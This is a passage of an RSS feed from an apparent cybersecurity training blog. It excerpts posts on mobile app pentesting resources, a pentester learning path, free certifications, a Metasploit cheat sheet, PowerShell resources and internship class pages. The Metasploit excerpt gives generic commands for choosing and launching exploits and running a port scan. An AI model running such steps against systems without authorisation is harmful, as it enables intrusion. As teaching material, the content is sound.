Mobile Application Security Testing Distributions All-in-one Mobile Security Frameworks Android Application Penetration Testing Reverse Engineering and Static Analysis Dynamic and Runtime Analysis Network Analysis and Server Side Testing Bypassing Root Detection and SSL Pinning Security Libraries iOS Application Penetration Testing Access Filesystem on iDevice Reverse Engineering and Static Analysis Dynamic and Runtime Analysis Network Analysis and Server Side Testing Bypassing Root Detection and SSL Pinning Security Libraries Mobile Penetration Testing Lab Contribution License Mobile Application Security Testing Distributions Appie - A portable software package for Android Pentesting and an awesome alternative to existing Virtual machines.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/learnings-mobileapppt/</link></item><item><title>Keep Learning</title><pubDate>Tue, 09 Mar 2021 21:05:41 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description> Journey of a Pentester the starting point will be:
understanding of OS Networking (routing/protocols) useful during OPs pivoting reverse engineering (basic knowledge should do the job) Active Directory emails / exchange file/ application servers web applications. Freshers! start learning with pentesterlab.com Web Based Courses &amp;amp; Labs pentesteracademy.com Labs + course Testing your skills tryhackme.com Beginenr Friendly hackthebox.eu get your swags recommended Certs C|EH (Indian HRs loves it) OSCP CRTP OSWE</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/learnings/</link></item><item><title>Free Certifications</title><pubDate>Sun, 21 Feb 2021 21:23:22 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Free Certifications Curated list of free courses &amp;amp; certifications.
The offers on top of the table are time-limited and will expire soon. So, hurry up and grab them first!
Technology Provider Description Link Expiration Google Cloud Google One free month at Qwiklabs, Pluralsight &amp;amp; Coursera learning platforms. Pluralsight &amp;amp; Coursera require a credit card. Don’t forget to cancel in time. (Qwiklabs seem still to work. Rest - expired) Link ?31-May-2020? Agile Atlassian Free access to Atlassian’s on-demand courses ($300 value each).</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/blog4/</link></item><item><title>Metasploit Cheat Sheet</title><pubDate>Sun, 21 Feb 2021 21:23:22 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Metasploit Cheat Sheet The Metasploit Project is a computer security project that provides information on vulnerabilities, helping in the development of penetration tests and IDS signatures.
Metasploit is a popular tool used by pentest experts. I have prepared a document for you to learn.
Metasploit : Search for module: msf &amp;gt; search [regex] Specify and exploit to use: msf &amp;gt; use exploit/[ExploitPath] Specify a Payload to use: msf &amp;gt; set PAYLOAD [PayloadPath] Show options for the current modules: msf &amp;gt; show options Set options: msf &amp;gt; set [Option] [Value] Start exploit: msf &amp;gt; exploit Useful Auxiliary Modules Port Scanner: msf &amp;gt; use auxiliary/scanner/portscan/tcp msf &amp;gt; set RHOSTS 10.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/metasploit-cheat-sheet/</link></item><item><title>Awesome Powershell</title><pubDate>Thu, 18 Feb 2021 21:23:22 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Awesome PowerShell A curated list of delightful PowerShell packages and resources.
PowerShell is a cross-platform (Windows, Linux, and macOS) automation and configuration tool that is optimized for dealing with structured data (e.g. JSON, CSV, XML, etc.), REST APIs, and object models. It includes a command-line shell and an associated scripting language.
Contents Awesome PowerShell Contents API Wrapper Blogs Books Build Tools Code and Package Repositories Commandline Productivity Communities Data Documentation Helper Editors and IDEs Frameworks Interactive Learning Logging Module Development Templates Package Managers Parallel Processing Podcasts Security SharePoint SQL Server Testing Themes UI Videos Webserver Misc API Wrapper HipChatAdmin - A module for simple integration with Atlassian HipChat via the HipChat API.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/ref-powershell/</link></item><item><title>SmartKnowner: SEP Batch</title><pubDate>Sat, 12 Sep 2020 21:23:22 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Online Links Name Links One Note Online Agenda PDF WhatsApp Group Join For Any technical Help : classroom@anir0y.in For other Quries, please contact Support team. Progress Date Topic Tasks(optional) Status SEP 7 Introdution Day -01 Completed Sep 14 OS Day -02 Completed Sep 15 Info Sec Day -03 Completed Sep 17 Risk Management Day -04 Completed EOF EOF EOF EOF Topic Link IP address https://tools.ietf.org/html/rfc791#ref-1 Network Forensic https://cyberdefenders.org/ IETF https://www.ietf.org/standards/ CEH https://arishti.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/2020-08-07-smartknowner-sep/</link></item><item><title>SmartKnowner: AUG Batch</title><pubDate>Wed, 12 Aug 2020 21:23:22 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>+++ title = &amp;ldquo;SmartKnowner: AUG Batch! &amp;quot; description = &amp;ldquo;Smartknowner cybersecurity internship&amp;rdquo; tags = [ &amp;ldquo;Classroom&amp;rdquo;, &amp;ldquo;learning&amp;rdquo;, ] date= &amp;ldquo;12 Aug 2020&amp;rdquo; categories = [ &amp;ldquo;Classroom&amp;rdquo;, ] image = &amp;ldquo;fast-lane.jpg&amp;rdquo; +++
Hello, Links to our classroom will be available here. Name Links One Note Weblink Agenda download pdf WhatsApp Group Join Here Progress [√]Session Start [√] Installation of VM Download VM Oracle Virtual Box Vmware OS download Kali Win7 ubuntu Networking [√] Minor Project : Download here [0] Major Project</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/2020-08-07-smartknowner-aug/</link></item><item><title>Verzeo: JULY Batch</title><pubDate>Wed, 12 Aug 2020 21:23:22 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Hello, Links to our classroom will be available here. Name Links One Note Weblink Agenda download pdf WhatsApp Group Join Here Progress Session Start [0] Installation of VM Download VM Oracle Virtual Box Vmware OS download Kali Win7 ubuntu Networking [0] Minor Project [0] Major Project</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/2020-08-07-verzeo-aug/</link></item><item><title>SmartKnowner: JULY Batch</title><pubDate>Sun, 12 Jul 2020 21:23:22 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Hello, Links to our classroom will be available here. Name Links One Note Weblink Agenda download pdf WhatsApp Group Join Here Progress Session Start Installation of VM Download VM Oracle Virtual Box Vmware OS download Kali Win7 ubuntu Networking [0] Minor Project [0] Major Project</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/2020-08-07-smartknowner-july/</link></item><item><title>Verzeo JULY Batch</title><pubDate>Tue, 07 Jul 2020 21:23:22 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Hello, Links to our classroom will be available here. Name Links One Note Weblink Agenda download pdf One Drive Web Link Minor Project Download Progress Session Start Installation of VM Download VM Oracle Virtual Box Vmware OS download Kali Win7 ubuntu Networking Minor Project : Download [0] Major Project</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/2020-07-07-verzeo-july/</link></item><item><title>Prequties for Training</title><pubDate>Wed, 01 Jan 2020 21:23:22 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Prerequisites As this is based on Basics of cyber security, so basic knowledge of computer and programming language (PHP,MySQL,Python) is a bonus. if you don’t know anything about these, you can learn the basic for free here
System requirements A laptop/Desktop with least 2MBPS internet connection. 50 GB of disk space 4 GB of RAM (min) any processor above i3 3rd generation.
OS recommendation As this is designed for entry level training.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/blog3/</link></item></channel></rss>